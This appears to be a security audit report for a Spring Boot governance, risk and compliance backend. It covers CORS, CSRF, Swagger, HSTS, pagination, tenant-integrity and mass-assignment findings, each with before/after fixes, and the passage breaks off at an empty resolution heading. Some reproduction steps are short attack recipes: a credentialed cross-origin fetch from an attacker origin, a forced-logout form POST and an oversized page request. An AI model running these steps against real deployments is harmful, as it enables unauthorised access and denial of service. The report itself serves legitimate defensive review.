Location tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:71-153 Effort S Risk Risk rationale: the declared, over-permissive CORS policy is inert (no .cors() and no addCorsMappings), so the dangerous wildcard+credentials combo does NOT take effect — but the same omission is a latent footgun and a functional defect. Low.
tss-grc-backend/src/main/java/com/tss/grc/config/CorsConfig.java:30-49
tss-grc-backend/src/main/java/com/tss/grc/config/WebMvcConfig.java:11-42

Description

CorsConfig declares a CorsConfigurationSource bean named corsConfigurationSource, but the Order(2) securityFilterChain never calls http.cors(...). In Spring Security 6, merely declaring a CorsConfigurationSource bean does NOT auto-activate CORS for the filter chain — you must explicitly call .cors(c -> c.configurationSource(corsConfigurationSource)) (or rely on the default lookup, which still requires the .cors() DSL entry). WebMvcConfig also does not override addCorsMappings, and no CorsFilter/FilterRegistrationBean exists anywhere in the codebase (verified by grep). Consequently the CORS policy is dormant: the API emits no Access-Control-Allow-Origin headers via this configuration. This is simultaneously (a) the mitigating factor that neuters SEC-CFG-003's over-broad dev origins, and (b) a latent risk — the moment someone adds http.cors() to 'fix' cross-origin in dev, the dangerous wildcard+credentials policy in CorsConfig becomes live.

Root cause

The CorsConfig class predates the security-chain refactor; the author assumed bean-by-name auto-detection (which existed in older Spring Security WebSecurityConfigurerAdapter setups) still applies. The Order(2) chain was written without a .cors() call.

Evidence / proof
// SecurityConfig.securityFilterChain — no .cors(...) anywhere:
http
    .csrf(AbstractHttpConfigurer::disable)
    .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
    .authorizeHttpRequests(auth -> auth ... )
    .addFilterBefore(jwtAuthenticationFilter, ...)
    .exceptionHandling(...)
    .headers(...);
// grep for '.cors(' / 'CorsConfigurationSource' in SecurityConfig.java => no matches

Real-world impact

Functionally, browser-based cross-origin calls from the dev UI on a different port would not receive CORS headers from this config (may be masked by the static server/proxy). Security-wise the inert state is currently protective, but the disconnect between declared intent (a permissive credentialed CORS policy) and actual wiring is a trap: a future one-line 'fix' silently exposes the over-broad policy of SEC-CFG-003.

Reproduction

1. Start the API. 2. From a browser origin, issue a cross-origin fetch with credentials to /api/**. 3. Observe no Access-Control-Allow-Origin response header is set by CorsConfig. 4. grep the codebase: no .cors(, no addCorsMappings, no CorsFilter — confirming the bean is unconsumed.

Resolution

Decide explicitly: if CORS is needed, wire the source via http.cors(c -> c.configurationSource(corsConfigurationSource)) AND first tighten CorsConfig per SEC-CFG-003. If CORS is intentionally handled by the reverse proxy in prod and the static dev server in dev, delete CorsConfig to remove the misleading dead code. Do not leave a permissive-but-dormant policy in the tree.

▼ Before (vulnerable)
@Bean
@Order(2)
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(AbstractHttpConfigurer::disable)
        .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth ... )
▲ After (fixed)
@Bean
@Order(2)
public SecurityFilterChain securityFilterChain(HttpSecurity http, CorsConfigurationSource corsSource) throws Exception {
    http
        .cors(c -> c.configurationSource(corsSource)) // wire the (now-tightened) source
        .csrf(AbstractHttpConfigurer::disable)
        .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth ... )
References: CWE-942: Permissive Cross-domain Policy with Untrusted Domains · Spring Security Reference — CORS (requires explicit http.cors()) · OWASP A05:2021 Security Misconfiguration
LowSEC-CFG-003Over-broad CORS allowedOriginPatterns (10.* / 172.* / 192.168.* on any port) combined with allowCredentials=true
SecuritySecurity Misconfiguration / CORS (A05:2021 / CWE-942)▾
Location tss-grc-backend/src/main/resources/application-dev.yml:65-71 Effort S Risk Risk rationale: dangerous pattern (broad private-IP wildcards + credentials) but only in the dev profile and currently inert because the source is not wired (SEC-CFG-002). Would be Medium/High if wired or copied to prod.
tss-grc-backend/src/main/java/com/tss/grc/config/CorsConfig.java:39-44
tss-grc-backend/src/main/resources/application.yml:142-145
tss-grc-backend/src/main/resources/application-prod.yml:106-115

Description

The dev profile sets grc.cors.allowed-origins to include broad private-network wildcard patterns: http://192.168.*:[*], http://10.*:[*], http://172.*:[*]. CorsConfig feeds these into setAllowedOriginPatterns(...) with setAllowCredentials(true) and setMaxAge(3600). allowedOriginPatterns is precisely the mechanism that lets wildcards coexist with credentials (which setAllowedOrigins would reject), so the safety net Spring normally provides (no wildcard-with-credentials) is deliberately bypassed. The patterns match the entire RFC-1918 space (10.0.0.0/8, 172.16/12-ish via 172.*, 192.168/16) on ANY port. Any host on those ranges — including an attacker on the same LAN/VPN or a malicious site that can reach a victim's private IP — becomes a trusted credentialed origin. Separately, the PROD profile (application-prod.yml grc: block, lines 106-115) does NOT override grc.cors.allowed-origins, so it inherits the base default http://localhost:3000 (application.yml:145) rather than the documented empty list — a config drift from the stated 'set to empty list in prod' intent (CorsConfig javadoc lines 19-23).

Root cause

Convenience for LAN dev access (reach the dev UI from another machine without per-IP config — comment lines 66-70). Wildcard origin patterns plus allowCredentials were chosen to make this frictionless, trading away origin validation. Prod was never given an explicit empty CORS list, so it silently inherits a localhost default.

Evidence / proof
allowed-origins: "...,http://192.168.*:[*],http://10.*:[*],http://172.*:[*]"
// CorsConfig.java
config.setAllowedOriginPatterns(allowedOrigins);
config.setAllowCredentials(true);   // Required for HttpOnly refresh-token cookie

Real-world impact

If/when the CORS source is wired (see SEC-CFG-002), any origin in the RFC-1918 ranges on any port can make credentialed cross-origin calls and read responses — enabling a malicious page (or co-tenant on a shared dev/staging LAN/VPN) to drive the authenticated API on a victim's behalf and exfiltrate cross-tenant GRC data. The prod default of localhost:3000 means a real browser front-end on the production domain would be CORS-blocked (functional bug) while localhost is needlessly trusted.

Reproduction

1. (After wiring http.cors) From a page served at http://10.13.37.5:9999 in a victim's browser, fetch('https://api-host/api/v1/...', {credentials:'include'}). 2. Observe Access-Control-Allow-Origin echoes the attacker origin and Access-Control-Allow-Credentials: true, allowing the response to be read. 3. For prod drift: deploy with profile prod, inspect effective grc.cors.allowed-origins => http://localhost:3000 (inherited), not empty.

Resolution

Replace wildcard ranges with the exact, known dev origins (specific host:port entries). Never combine broad wildcards with allowCredentials=true. In prod, set grc.cors.allowed-origins explicitly to the production front-end origin(s) or an empty list if same-origin via Nginx — do not rely on inheritance of the localhost default.

▼ Before (vulnerable)
# application-dev.yml
allowed-origins: "...,http://192.168.*:[*],http://10.*:[*],http://172.*:[*]"
▲ After (fixed)
# application-dev.yml — enumerate exact dev hosts, no broad RFC-1918 wildcards
allowed-origins: "http://localhost:3000,http://127.0.0.1:3000,http://localhost:8086,http://127.0.0.1:8086,http://<your-dev-machine-ip>:8086"
# application-prod.yml — be explicit
grc:
  cors:
    allowed-origins: "https://grc.yourdomain.sa"   # or "" for same-origin behind Nginx
References: CWE-942: Permissive Cross-domain Policy with Untrusted Domains · CWE-346: Origin Validation Error · PortSwigger — Exploiting CORS misconfigurations · OWASP A05:2021 Security Misconfiguration
LowSEC-CFG-004Multipart upload size limits set under wrong YAML key (server.servlet.multipart) — defaults (1MB/10MB) silently in effect
SecuritySecurity Misconfiguration / Resource limits (A05:2021 / CWE-770)▾
Location tss-grc-backend/src/main/resources/application.yml:85-95 Effort S Risk Risk rationale: misconfiguration causes overly-restrictive defaults (uploads >1MB fail), not an unbounded-upload DoS. Functional + hardening concern. Low.
tss-grc-backend/src/main/resources/application.yml:154-158

Description

The multipart limits are declared under server.servlet.multipart (max-file-size: 50MB, max-request-size: 55MB). Spring Boot binds multipart limits from spring.servlet.multipart (MultipartProperties, prefix 'spring.servlet.multipart'), NOT server.servlet.multipart. The 'server.servlet' namespace has no 'multipart' child, so this block is unbound/ignored and the framework defaults apply (max-file-size 1MB, max-request-size 10MB). No @Bean MultipartConfigElement or MultipartResolver overrides it anywhere (verified by grep). Net effect: the evidence-upload feature the comment describes ('Default is 1MB which is too small for real evidence documents') is in fact still capped at the 1MB default. From a security angle this is the inverse of a DoS — limits are too tight rather than too loose — but it is a misconfiguration that defeats an intended control and leaves the real (default) limits undocumented and unreviewed.

Root cause

Wrong configuration prefix: the author placed multipart under 'server.servlet' (alongside encoding) instead of the Spring Boot binding prefix 'spring.servlet.multipart'. The mistake is masked because oversized uploads simply fail with the default-limit error, which can look like an application/file-size rule.

Evidence / proof
server:
  servlet:
    context-path: /
    encoding: { charset: UTF-8, enabled: true, force: true }
    multipart:
      max-file-size: 50MB        # <-- under server.servlet, NOT spring.servlet — ignored
      max-request-size: 55MB

Real-world impact

Intended 50MB evidence uploads actually fail at 1MB; operators may not realise the effective limit. Because the limit lives at a non-binding key, multipart resource limits are not actually governed by config and are easy to overlook in a hardening review — a future move of this key to the correct prefix with a too-large value (or 'unlimited') would create an upload-DoS vector.

Reproduction

1. POST a >1MB file to an evidence upload endpoint (e.g. /api/v1/evidence/items/{id}/file). 2. Observe MaxUploadSizeExceededException at ~1MB despite the 50MB config. 3. Confirm by relocating the block to spring.servlet.multipart and re-testing — the 50MB limit then takes effect.

Resolution

Move the multipart block to spring.servlet.multipart so it binds to MultipartProperties, and choose deliberate, documented limits aligned to grc.storage.max-file-size-mb (50). Keep request-size modestly above file-size.

▼ Before (vulnerable)
server:
  servlet:
    multipart:
      max-file-size: 50MB
      max-request-size: 55MB
▲ After (fixed)
spring:
  servlet:
    multipart:
      max-file-size: 50MB
      max-request-size: 55MB
      file-size-threshold: 2MB
References: CWE-770: Allocation of Resources Without Limits or Throttling · Spring Boot — MultipartProperties (prefix spring.servlet.multipart) · OWASP A05:2021 Security Misconfiguration
LowSEC-CFG-005CSRF globally disabled while a long-lived refresh token is stored in a cookie
SecurityCross-Site Request Forgery (A01:2021 — Broken Access Control / CWE-352)▾
Location tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:73-74 Effort S Risk Risk rationale: access-token auth is header-based Bearer (not cookie) so most state-changing API calls are CSRF-immune; residual risk is limited to the cookie-authenticated /api/auth/refresh endpoint and depends on the cookie's SameSite attribute. Low.
tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:63
tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:83-84
tss-grc-backend/src/main/resources/application-prod.yml:83-89

Description

CSRF protection is disabled on both filter chains (csrf(AbstractHttpConfigurer::disable)). The architectural justification ('not needed for stateless JWT') is sound for the access token, which is carried in the Authorization: Bearer header and stored in sessionStorage — a custom header is not auto-attached by the browser cross-site, so those calls are inherently CSRF-resistant. However the system ALSO uses an HttpOnly refresh-token cookie (7 days) and exposes POST /api/auth/refresh and POST /api/auth/logout as permitAll cookie-authenticated endpoints. Cookies ARE sent automatically by the browser on cross-site requests, so /api/auth/refresh and /api/auth/logout are reachable via CSRF unless the cookie's SameSite attribute blocks it. The prod profile sets server.servlet.session.cookie.same-site=strict (lines 83-89), but that property governs the SERVLET SESSION cookie (JSESSIONID), not the application-issued refresh-token cookie, which is created in AuthController code (outside these config files). If that cookie is not explicitly SameSite=Strict/Lax, a cross-site POST to /api/auth/refresh forces a token refresh (and /api/auth/logout forces a logout — a session-fixation/denial nuisance).

Root cause

Blanket csrf-disable applied to the whole API based on the Bearer-token model, without carving out the cookie-authenticated refresh/logout endpoints. The only cookie hardening present (same-site=strict in prod) targets the servlet session cookie, not the custom refresh cookie set in AuthController.

Evidence / proof
// SecurityConfig
.csrf(AbstractHttpConfigurer::disable)
...
.requestMatchers(HttpMethod.POST, "/api/auth/refresh").permitAll()
.requestMatchers(HttpMethod.POST, "/api/auth/logout").permitAll()

Real-world impact

If the refresh cookie lacks a restrictive SameSite, an attacker page can issue a cross-site POST to /api/auth/refresh (token churn / potential token-fixation depending on rotation) or /api/auth/logout (forced logout — availability nuisance). Impact is bounded because the refreshed access token is returned in the response body, which the cross-site attacker cannot read (CORS), so account takeover is not directly achievable via this vector.

Reproduction

1. Log in to obtain the refresh cookie. 2. From an attacker-controlled origin, auto-submit a form POST to https://api-host/api/auth/logout (no custom headers, simple request). 3. If the refresh cookie is sent and not SameSite-blocked, the victim is logged out. 4. Repeat against /api/auth/refresh to observe forced token rotation. 5. Inspect Set-Cookie for the refresh token in AuthController to confirm/deny SameSite.

Resolution

Verify the refresh-token cookie is set with SameSite=Strict (or at least Lax), HttpOnly, and Secure in prod. Given SameSite=Strict, CSRF on these endpoints is mitigated. For defence-in-depth, consider keeping CSRF disabled for Bearer-authenticated routes but require a custom header / double-submit token specifically on the cookie-authenticated /api/auth/refresh and /api/auth/logout, or bind refresh to a header-supplied value in addition to the cookie.

▼ Before (vulnerable)
// AuthController (refresh cookie) — verify attributes
ResponseCookie.from("refreshToken", token)
    .httpOnly(true)
    .path("/api/auth")
    .maxAge(Duration.ofDays(7))
    .build();
▲ After (fixed)
ResponseCookie.from("refreshToken", token)
    .httpOnly(true)
    .secure(true)        // prod
    .sameSite("Strict")  // block cross-site auto-send -> CSRF mitigated
    .path("/api/auth")
    .maxAge(Duration.ofDays(7))
    .build();
References: CWE-352: Cross-Site Request Forgery (CSRF) · OWASP A01:2021 Broken Access Control · OWASP CSRF Prevention Cheat Sheet — SameSite cookies
LowSEC-CFG-007Swagger/OpenAPI security chain (Order 1) permits all and is enabled in dev; CSP intentionally relaxed
SecuritySecurity Misconfiguration / Information Disclosure (A05:2021 / CWE-651)▾
Location tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:56-67 Effort M Risk Risk rationale: API surface disclosure limited to dev (prod disables springdoc), and the permissive chain only matches doc paths. Low.
tss-grc-backend/src/main/resources/application.yml:115-125
tss-grc-backend/src/main/resources/application-dev.yml:117-122
tss-grc-backend/src/main/resources/application-prod.yml:117-121
tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:89-90

Description

A dedicated Order(1) filter chain matches /swagger-ui.html, /swagger-ui/**, /v3/api-docs, /v3/api-docs/**, /webjars/** and applies anyRequest().permitAll() with CSRF disabled and, deliberately, NO Content-Security-Policy (comment line 54: 'No CSP restriction: Swagger UI requires inline scripts/styles to render'). The full API spec is therefore served without authentication wherever this chain is active. This is gated by springdoc.swagger-ui.enabled / api-docs.enabled — dev enables both (application-dev.yml:117-122), base defaults swagger-ui to env SWAGGER_ENABLED:false, and prod sets swagger-ui.enabled=false AND api-docs.enabled=false (application-prod.yml:117-121). When springdoc is disabled the doc endpoints 404, so prod exposure is closed. Residual concerns: (1) the security chain still permits these paths regardless of the springdoc flag, so re-enabling springdoc (or any future controller mapped under these prefixes) is exposed without auth and without CSP; (2) the relaxed-CSP Swagger chain has no X-Frame-Options/CSP frame-ancestors, so Swagger UI pages are framable (clickjacking) when enabled; (3) in dev the entire authenticated API surface (every endpoint, schema, example) is published to anyone who can reach the dev port — relevant given the broad LAN CORS/access intent in SEC-CFG-003.

Root cause

Defence-in-depth was traded for Swagger UI rendering convenience: a separate permissive chain with no CSP, gated only by the springdoc enable flags rather than also by the security chain. The permit rules and the enable flags are maintained in two places that can drift.

Evidence / proof
@Bean @Order(1)
public SecurityFilterChain swaggerFilterChain(HttpSecurity http) throws Exception {
    http.securityMatcher("/swagger-ui.html", "/swagger-ui/**", "/v3/api-docs", "/v3/api-docs/**", "/webjars/**")
        .csrf(AbstractHttpConfigurer::disable)
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth.anyRequest().permitAll());
    return http.build();
}

Real-world impact

In dev/staging (or any environment where springdoc is enabled), unauthenticated users reach the complete API documentation, aiding endpoint and parameter discovery for attacks. The missing frame-ancestors/X-Frame-Options on the Swagger chain allows clickjacking of the docs UI where enabled. Prod is protected only by the springdoc disable flags; the security layer itself would still permit the paths if those flags were ever flipped.

Reproduction

1. With profile dev, GET /v3/api-docs and /swagger-ui.html without any Authorization header -> full spec / UI returned. 2. Inspect response headers on /swagger-ui.html -> no Content-Security-Policy, no X-Frame-Options from the Order(1) chain. 3. With profile prod, GET /v3/api-docs -> 404 (springdoc.api-docs.enabled=false).

Resolution

Restrict the Swagger paths to non-prod and/or require authentication (or network-restrict to internal IPs) even in dev. Keep the security-chain permit and the springdoc enable flag in sync (ideally make the chain conditional on the same property/profile). Apply at least frame-ancestors 'none' / X-Frame-Options DENY to the Swagger chain to prevent clickjacking; relax only script/style-src as Swagger truly needs.

▼ Before (vulnerable)
@Bean @Order(1)
public SecurityFilterChain swaggerFilterChain(HttpSecurity http) throws Exception {
    http.securityMatcher(...)
        .csrf(AbstractHttpConfigurer::disable)
        .authorizeHttpRequests(auth -> auth.anyRequest().permitAll());
    return http.build();
}
▲ After (fixed)
@Profile({"dev","staging"})  // never register this chain in prod
@Bean @Order(1)
public SecurityFilterChain swaggerFilterChain(HttpSecurity http) throws Exception {
    http.securityMatcher(...)
        .csrf(AbstractHttpConfigurer::disable)
        .headers(h -> h.frameOptions(f -> f.deny())
            .contentSecurityPolicy(csp -> csp.policyDirectives(
                "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'")))
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated()); // or hasRole(ADMIN)
    return http.build();
}
References: CWE-651: Exposure of WSDL File / API documentation Containing Sensitive Information · CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking) · OWASP A05:2021 Security Misconfiguration
LowSEC-CFG-008HSTS header emitted in dev over HTTP (max-age 1 year, includeSubDomains) can poison clients
SecuritySecurity Misconfiguration (A05:2021 / CWE-319)▾
Location tss-grc-backend/src/main/java/com/tss/grc/config/SecurityConfig.java:142-144 Effort S Risk Risk rationale: HSTS over plaintext dev can pin a developer's browser to HTTPS for the host for a year; nuisance/availability, low confidentiality impact. Low.
tss-grc-backend/src/main/resources/application-dev.yml:53-54

Description

The Order(2) chain unconditionally enables HSTS with maxAgeInSeconds(31536000) and includeSubDomains(true) for ALL profiles. The dev profile runs plain HTTP on port 8084 (no server.ssl). Browsers ignore HSTS received over plain HTTP per spec for the response that delivered it, but if the dev server is ever reached over HTTPS (e.g. via a TLS-terminating proxy, or a shared hostname), or a colleague accesses a LAN dev host that also serves other apps on subdomains, the 1-year includeSubDomains HSTS can force HTTPS-only on that hostname and its subdomains — breaking access to sibling plain-HTTP dev services. Conversely, the genuinely valuable HSTS is in prod (TLS on 8443), where it is correct. The issue is the lack of profile-scoping: HSTS belongs to TLS-terminated environments only.

Root cause

Security headers are configured once in a shared chain with no profile awareness; HSTS (a TLS-only directive) is applied even in the plaintext dev profile.

Evidence / proof
.httpStrictTransportSecurity(hsts -> hsts
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true))
// dev runs HTTP: application-dev.yml -> server.port: 8084, no ssl

Real-world impact

Developer/QA browsers can be pinned to HTTPS for a dev hostname (and all its subdomains) for a year, breaking access to other plaintext dev services on shared hostnames and causing confusing connection-refused errors that are hard to clear. No direct attacker benefit, but a real operational footgun, especially combined with the LAN-access intent.

Reproduction

1. Front the dev server with any TLS terminator (or access a dev host that has both HTTP and HTTPS). 2. Browser receives Strict-Transport-Security: max-age=31536000; includeSubDomains. 3. Subsequent plain-HTTP access to that host/subdomains is force-upgraded to HTTPS by the browser for a year.

Resolution

Scope HSTS to TLS-enabled profiles only (e.g. enable the header block in prod profile / when server.ssl.enabled=true). Optionally lower includeSubDomains unless every subdomain is HTTPS. Leave HSTS fully enabled in prod where it is correct.

▼ Before (vulnerable)
.httpStrictTransportSecurity(hsts -> hsts
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true))
▲ After (fixed)
// inject @Value("${server.ssl.enabled:false}") boolean sslEnabled;
.httpStrictTransportSecurity(hsts -> {
    if (sslEnabled) { hsts.maxAgeInSeconds(31536000).includeSubDomains(true); }
    else { hsts.disable(); }
})

SecurityUncontrolled Resource Consumption (A05 / CWE-770)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/regreporting/controller/RegReportingController.java:80-122 Effort S Risk CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) — caller-controlled, uncapped page size
tss-grc-backend/src/main/java/com/tss/grc/module/regreporting/service/RegReportingService.java:405-409
tss-grc-backend/src/main/java/com/tss/grc/module/reginspect/controller/RegInspectController.java:65-72
tss-grc-backend/src/main/java/com/tss/grc/module/reginspect/service/RegInspectService.java:262-267

Description

listObligations/listFilings (regreporting) and list (reginspect) accept raw @RequestParam int page and int size and pass them straight into PageRequest.of(page, size) in the service with no upper bound. A caller can request size=1000000 and force the server to materialise and serialise an enormous page in one query. This contrasts with the ControlController/obligation controllers which use @PageableDefault. (Several aggregate reads in this package also hard-code PageRequest.of(0,1000) in-memory, e.g. FrameworkAnchorController.findingsAging — bounded but a fixed wide page.)

Root cause

No maximum-size clamp on user-supplied pagination parameters before constructing the Pageable.

Evidence / proof
public Page<ObligationResponse> listObligations(int page, int size) {
    return obligationRepo.findByOrganisationIdOrderByCodeAsc(org(), PageRequest.of(page, size))
            .map(this::toObligation);
}

Real-world impact

An authenticated user can trigger large heap allocation and slow queries by requesting a very large page size, contributing to denial of service. Impact is bounded by the tenant's row counts but still allows disproportionate resource use from a single request.

Reproduction

GET /api/v1/regreporting/filings?page=0&size=10000000 — the server attempts to load up to that many rows in one page.

Resolution

Clamp size to a sane maximum (e.g. Math.min(size, 200)) and validate page>=0, or switch these endpoints to Spring's resolved Pageable with @PageableDefault and a configured spring.data.web.pageable.max-page-size.

▼ Before (vulnerable)
public Page<ObligationResponse> listObligations(int page, int size) {
    return obligationRepo.findByOrganisationIdOrderByCodeAsc(org(), PageRequest.of(page, size))
            .map(this::toObligation);
}
▲ After (fixed)
public Page<ObligationResponse> listObligations(int page, int size) {
    int safeSize = Math.min(Math.max(size, 1), 200);
    int safePage = Math.max(page, 0);
    return obligationRepo.findByOrganisationIdOrderByCodeAsc(org(), PageRequest.of(safePage, safeSize))
            .map(this::toObligation);
}

LowSEC-CMP-007Cross-tenant foreign-key references accepted without ownership validation (assessmentId, frameworkId, policyId, relatedControlId/relatedRiskId)
SecurityImproper Validation of Specified Resource (A04 / CWE-20) — tenant integrity▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/compliance/service/ComplianceService.java:198-208 Effort M Risk CVSS 3.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — dangling cross-tenant references, no direct data read
tss-grc-backend/src/main/java/com/tss/grc/module/policy/service/PolicyService.java:330-345
tss-grc-backend/src/main/java/com/tss/grc/module/policy/service/PolicyService.java:433-445
tss-grc-backend/src/main/java/com/tss/grc/module/compliance/obligation/service/ObligationService.java:129-186

Description

Several create/update paths accept foreign-key ids from the request body and persist them on a freshly org-stamped row without verifying that the referenced parent belongs to the caller's tenant. Examples: ComplianceService.applyFinding sets f.assessmentId / f.frameworkId from the request; PolicyService.createException sets policyId and createAttestation sets policyId from the body; ObligationService.create/update sets relatedControlId / relatedRiskId. The owning row is correctly stamped with the caller's organisationId, so no cross-tenant data is read back through these objects, but the stored reference can point at another tenant's primary key, creating dangling/forged linkage that may mislead downstream joins, rollups, or future features that dereference these ids.

Root cause

Foreign-key inputs are trusted as-is; there is no 'parent belongs to same org' check before the reference is saved.

Evidence / proof
private void applyFinding(AuditFinding f, FindingRequest req) {
    f.setAssessmentId(req.assessmentId());     // not validated against caller's org
    ...
    if (req.frameworkId() != null) f.setFrameworkId(req.frameworkId());
}

Real-world impact

Data-integrity / referential-integrity weakness: a tenant can attach references to objects it does not own, polluting reporting links and risking information disclosure if any future code path resolves these ids without re-checking org ownership. No direct cross-tenant read occurs today through the audited paths.

Reproduction

1. As tenant A, POST /api/v1/compliance/findings with assessmentId set to a tenant-B assessment id. 2. The finding is created in tenant A but references a foreign assessment; the link is silently accepted.

Resolution

On each write, validate that supplied parent ids resolve to a row owned by TenantContext.getCurrentTenant() (e.g. assessmentRepo.findById(id).filter(a -> a.getOrganisationId().equals(org)) ...), rejecting otherwise. Apply the same check to policyId (exceptions/attestations) and relatedControlId/relatedRiskId on obligations.

▼ Before (vulnerable)
if (req.frameworkId() != null) f.setFrameworkId(req.frameworkId());
f.setAssessmentId(req.assessmentId());
▲ After (fixed)
if (req.assessmentId() != null) {
    assessmentRepo.findById(req.assessmentId())
        .filter(a -> a.getOrganisationId().equals(orgId))
        .orElseThrow(() -> new IllegalArgumentException("assessmentId not in tenant"));
    f.setAssessmentId(req.assessmentId());
}
// validate frameworkId similarly before assignment

SecurityImproper Input Validation / Mass Assignment (A04/A08)▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/cyber/controller/CyberController.java:61-65 Effort L Risk CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — unvalidated/over-broad input on write paths
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/controller/CyberController.java:91-95
tss-grc-backend/src/main/java/com/tss/grc/module/socops/controller/OtAssetController.java:34-43
tss-grc-backend/src/main/java/com/tss/grc/module/socops/controller/CryptoAssetController.java:42-51
tss-grc-backend/src/main/java/com/tss/grc/module/socops/controller/AppsecFindingController.java:36-51

Description

Most cyber and SOC-Ops write controllers bind raw JPA @Entity objects directly from @RequestBody with no @Valid annotation and no request DTO. The entities carry no Jakarta Bean Validation constraints on the bound fields, so callers can submit unconstrained strings (status/severity/workflow values outside the allowed enums, oversized free-text fields up to the column limit, audit/BaseEntity fields, etc.). This is the same class of input-trust problem that enables the id-driven mass-assignment in SEC-CYB-002, but is called out separately because the missing @Valid + DTO boundary also permits invalid workflow/enum values and unbounded text to reach persistence. The well-built reference modules (cyber_lc VulnerabilityDto with @NotBlank/@Pattern, vuln_sla and asm DTOs) show the intended pattern.

Root cause

Controllers expose persistence entities as the API request model instead of validated DTOs; @Valid is omitted, so even existing column constraints are only enforced (if at all) at the database layer rather than returning a clean 400.

Evidence / proof
@PostMapping("/frameworks")
@PreAuthorize("hasPermission('CYBER', 'WRITE')")
public ResponseEntity<CyberFramework> saveFramework(@RequestBody CyberFramework framework) {
    return ResponseEntity.ok(cyberService.saveFramework(framework, orgId()));
}

Real-world impact

Callers can persist semantically invalid records (e.g. arbitrary workflowStatus/severity strings that break dashboard aggregation and workflow state machines) and submit over-broad payloads. Combined with the entity-as-request-model design, it widens the attack surface for property-level abuse. Low severity on its own because no direct confidentiality breach results and the worst mass-assignment vector is tracked under SEC-CYB-002.

Reproduction

1. As a CYBER:WRITE user, POST /api/v1/cyber/vulnerabilities with {"severity":"PWNED","workflowStatus":"BOGUS", ...}.
2. The record is accepted; severity/workflowStatus persist unvalidated and skew dashboard counts and escalation logic.

Resolution

Introduce request DTOs for the cyber and SOC-Ops write endpoints (mirroring cyber_lc/vuln_sla/asm), annotate fields with @NotBlank/@Pattern/@Size, and add @Valid on the @RequestBody parameter. Map DTO -> entity inside the service so server-controlled fields (id, organisationId, externalId, audit fields, workflowStatus) are never client-settable.

▼ Before (vulnerable)
public ResponseEntity<CyberFramework> saveFramework(@RequestBody CyberFramework framework) {
    return ResponseEntity.ok(cyberService.saveFramework(framework, orgId()));
}
▲ After (fixed)
public ResponseEntity<CyberFrameworkResponse> saveFramework(@Valid @RequestBody CyberFrameworkRequest req) {
    return ResponseEntity.ok(cyberService.saveFramework(req, orgId()));
}
// CyberFrameworkRequest: @NotBlank titleEn; @Pattern(...) frameworkCode; ... (no id/org/workflow fields)

LowSEC-ESG-004AI-assisted suggestion endpoints accept unvalidated request bodies and lack function-level authorization (isAuthenticated only)
SecurityBroken Access Control / Improper Input Validation (A01/A04) — CWE-862 / CWE-20▾
Location tss-grc-backend/src/main/java/com/tss/grc/module/ai/controller/AiSuggestionController.java:41-93 Effort S Risk CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) — any user can generate/persist AI drafts; low direct impact
tss-grc-backend/src/main/java/com/tss/grc/module/ai/service/AiSuggestionService.java:73-105

Description

The /api/v1/ai/** suggestion endpoints (risk-description, bia-rto-rpo, evidence-quality, incident-root-cause, board-summary, workflow-submission-review, suggestions listing, and the suggestions/{id}/review accept/reject) are guarded only by @PreAuthorize("isAuthenticated()") and bind their record DTOs with no @Valid / no constraints. Unlike the AI governance registry (/api/v1/ai/models/**), which applies hasAnyRole READ/WRITE guards, these endpoints have no role separation: any authenticated user can drive the generator and accept/reject suggestion drafts. Exploitability and impact are limited because (a) the generators are deterministic rule-based heuristics with no outbound LLM/network call and no SQL, (b) every suggestion is persisted scoped to TenantContext org id and the review() path re-checks organisationId before mutating, and (c) suggestions are explicitly non-authoritative drafts that never mutate a real record on their own. The risk is therefore minor: unbounded creation of AiSuggestion rows (resource/audit-noise) and the ability for any user — rather than a designated reviewer — to mark a draft ACCEPTED/REJECTED. The board-summary input also reflects caller-supplied KPI numbers straight into a persisted narrative, so a user can fabricate a board posture string, but it is clearly labelled an unreviewed draft.

Root cause

The suggestion controller predates / was not aligned to the hasPermission model used elsewhere; DTOs are bound without validation and the accept/reject action is not restricted to a reviewer role.

Evidence / proof
AiSuggestionController.java:
  @PostMapping("/board-summary")
  @PreAuthorize("isAuthenticated()")
  public AiSuggestion boardSummary(@RequestBody BoardSummaryInput body) { return service.draftBoardSummary(body); }
  @PostMapping("/suggestions/{id}/review")
  @PreAuthorize("isAuthenticated()")
  public AiSuggestion review(@PathVariable Long id, @RequestBody ReviewBody body) { return service.review(id, body); }

Real-world impact

Any authenticated user can mass-generate AI suggestion drafts (DB/audit-log noise) and accept or reject another user's drafts. No cross-tenant exposure (org-scoped) and no record-of-truth mutation, so direct security impact is low.

Reproduction

As any authenticated user: POST /api/v1/ai/board-summary {...} repeatedly to spam AiSuggestion rows; or POST /api/v1/ai/suggestions/{id}/review {"decision":"ACCEPTED"} on a draft created by another (same-tenant) user.

Resolution

